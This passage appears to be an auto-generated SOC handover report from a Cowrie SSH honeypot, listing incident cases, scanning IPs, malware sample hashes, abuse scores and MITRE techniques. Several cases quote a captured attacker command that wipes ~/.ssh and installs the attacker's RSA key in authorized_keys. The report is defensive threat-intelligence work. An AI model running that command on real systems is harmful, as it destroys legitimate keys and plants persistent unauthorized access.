| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:33:14` | `cowrie.session.connect` |
| `2026-04-12 10:33:14` | `cowrie.client.version` |
| `2026-04-12 10:33:15` | `cowrie.client.kex` |
| `2026-04-12 10:33:15` | `cowrie.login.success` |
| `2026-04-12 10:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]169` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b74013954e

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:34 |
| **Last Seen** | 2026-04-12 10:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:34:14` | `cowrie.session.connect` |
| `2026-04-12 10:34:14` | `cowrie.client.version` |
| `2026-04-12 10:34:14` | `cowrie.client.kex` |
| `2026-04-12 10:34:15` | `cowrie.login.success` |
| `2026-04-12 10:34:16` | `cowrie.session.params` |
| `2026-04-12 10:34:16` | `cowrie.command.input` |
| `2026-04-12 10:34:16` | `cowrie.command.failed` |
| `2026-04-12 10:34:16` | `cowrie.log.closed` |
| `2026-04-12 10:34:17` | `cowrie.session.params` |
| `2026-04-12 10:34:17` | `cowrie.command.input` |
| `2026-04-12 10:34:17` | `cowrie.session.file_download` |
| `2026-04-12 10:34:17` | `cowrie.log.closed` |
| `2026-04-12 10:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80dc7e53281a

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:34 |
| **Last Seen** | 2026-04-12 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:34:21` | `cowrie.session.connect` |
| `2026-04-12 10:34:21` | `cowrie.client.version` |
| `2026-04-12 10:34:21` | `cowrie.client.kex` |
| `2026-04-12 10:34:22` | `cowrie.login.success` |
| `2026-04-12 10:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecb3cd43c5c

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:34 |
| **Last Seen** | 2026-04-12 10:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:34:43` | `cowrie.session.connect` |
| `2026-04-12 10:34:43` | `cowrie.client.version` |
| `2026-04-12 10:34:43` | `cowrie.client.kex` |
| `2026-04-12 10:34:44` | `cowrie.login.success` |
| `2026-04-12 10:34:45` | `cowrie.session.params` |
| `2026-04-12 10:34:45` | `cowrie.command.input` |
| `2026-04-12 10:34:45` | `cowrie.command.failed` |
| `2026-04-12 10:34:45` | `cowrie.log.closed` |
| `2026-04-12 10:34:46` | `cowrie.session.params` |
| `2026-04-12 10:34:46` | `cowrie.command.input` |
| `2026-04-12 10:34:46` | `cowrie.session.file_download` |
| `2026-04-12 10:34:46` | `cowrie.log.closed` |
| `2026-04-12 10:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c620e09aaa13

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:34 |
| **Last Seen** | 2026-04-12 10:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:34:50` | `cowrie.session.connect` |
| `2026-04-12 10:34:50` | `cowrie.client.version` |
| `2026-04-12 10:34:51` | `cowrie.client.kex` |
| `2026-04-12 10:34:52` | `cowrie.login.success` |
| `2026-04-12 10:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1112e8dac4

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:34 |
| **Last Seen** | 2026-04-12 10:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:34:58` | `cowrie.session.connect` |
| `2026-04-12 10:34:58` | `cowrie.client.version` |
| `2026-04-12 10:34:58` | `cowrie.client.kex` |
| `2026-04-12 10:35:00` | `cowrie.login.success` |
| `2026-04-12 10:35:00` | `cowrie.session.params` |
| `2026-04-12 10:35:00` | `cowrie.command.input` |
| `2026-04-12 10:35:00` | `cowrie.command.failed` |
| `2026-04-12 10:35:01` | `cowrie.log.closed` |
| `2026-04-12 10:35:01` | `cowrie.session.params` |
| `2026-04-12 10:35:01` | `cowrie.command.input` |
| `2026-04-12 10:35:01` | `cowrie.session.file_download` |
| `2026-04-12 10:35:02` | `cowrie.log.closed` |
| `2026-04-12 10:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb32e6b67a56

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:35 |
| **Last Seen** | 2026-04-12 10:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:35:05` | `cowrie.session.connect` |
| `2026-04-12 10:35:05` | `cowrie.client.version` |
| `2026-04-12 10:35:06` | `cowrie.client.kex` |
| `2026-04-12 10:35:07` | `cowrie.login.success` |
| `2026-04-12 10:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ecf8a460e5

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:35 |
| **Last Seen** | 2026-04-12 10:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:35:44` | `cowrie.session.connect` |
| `2026-04-12 10:35:44` | `cowrie.client.version` |
| `2026-04-12 10:35:45` | `cowrie.client.kex` |
| `2026-04-12 10:35:46` | `cowrie.login.success` |
| `2026-04-12 10:35:46` | `cowrie.session.params` |
| `2026-04-12 10:35:46` | `cowrie.command.input` |
| `2026-04-12 10:35:46` | `cowrie.command.failed` |
| `2026-04-12 10:35:46` | `cowrie.log.closed` |
| `2026-04-12 10:35:47` | `cowrie.session.params` |
| `2026-04-12 10:35:47` | `cowrie.command.input` |
| `2026-04-12 10:35:47` | `cowrie.session.file_download` |
| `2026-04-12 10:35:47` | `cowrie.log.closed` |
| `2026-04-12 10:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d4d935884c

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:35 |
| **Last Seen** | 2026-04-12 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:35:51` | `cowrie.session.connect` |
| `2026-04-12 10:35:51` | `cowrie.client.version` |
| `2026-04-12 10:35:51` | `cowrie.client.kex` |
| `2026-04-12 10:35:52` | `cowrie.login.success` |
| `2026-04-12 10:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `175.107.208[.]41` | **25** | 2026-04-12 10:25 | 2026-04-12 10:30 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `209.141.41[.]212` | **9** | 2026-04-12 10:29 | 2026-04-12 10:35 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `62.3.56[.]187` | **9** | 2026-04-12 10:18 | 2026-04-12 10:34 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.159[.]125` | **8** | 2026-04-12 10:22 | 2026-04-12 10:34 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `154.209.4[.]195` | **8** | 2026-04-12 10:20 | 2026-04-12 10:35 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `69.6.221[.]248` | **8** | 2026-04-12 10:19 | 2026-04-12 10:34 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `128.1.38[.]169` | **3** | 2026-04-12 10:29 | 2026-04-12 10:34 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `20.102.40[.]205` | **2** | 2026-04-12 09:53 | 2026-04-12 09:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.168.14[.]25` | **2** | 2026-04-12 10:05 | 2026-04-12 10:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.13.206[.]100` | 1 | 2026-04-12 10:20 | 2026-04-12 10:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.217.34[.]117` | 1 | 2026-04-12 10:29 | 2026-04-12 10:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.193.34[.]157` | 1 | 2026-04-12 10:30 | 2026-04-12 10:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `173.255.233[.]22` | 1 | 2026-04-12 08:44 | 2026-04-12 08:44 | 32s | 0 | `T1592` | 🟢 LOW |
| `180.184.82[.]249` | 1 | 2026-04-12 10:22 | 2026-04-12 10:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.143[.]203` | 1 | 2026-04-12 10:19 | 2026-04-12 10:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `181.23.113[.]121` | 1 | 2026-04-12 10:30 | 2026-04-12 10:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-04-12 10:32 | 2026-04-12 10:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-04-12 10:26 | 2026-04-12 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.231.192[.]36` | 1 | 2026-04-12 10:24 | 2026-04-12 10:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `173.255.233[.]22` | US | Linode | **100** ⚠️ | 6 |
| `180.76.143[.]203` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `181.23.113[.]121` | AR | Telefonica de Argentina | **100** ⚠️ | 1 |
| `183.250.89[.]44` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `20.102.40[.]205` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `154.209.4[.]195` | HK | Yisu Cloud Ltd | **100** ⚠️ | 26 |
| `69.6.221[.]248` | BR | Newfold Digital, Inc. | **100** ⚠️ | 13 |
| `128.1.38[.]169` | SG | UCLOUD | **100** ⚠️ | 50 |
| `103.13.206[.]100` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 20 |
| `209.141.41[.]212` | US | FranTech Solutions | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 92 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 38 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 123 cases |
| Tool 34  | Credential Extractor        | ✅ 88 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 38 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 74 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T10:37:14Z_
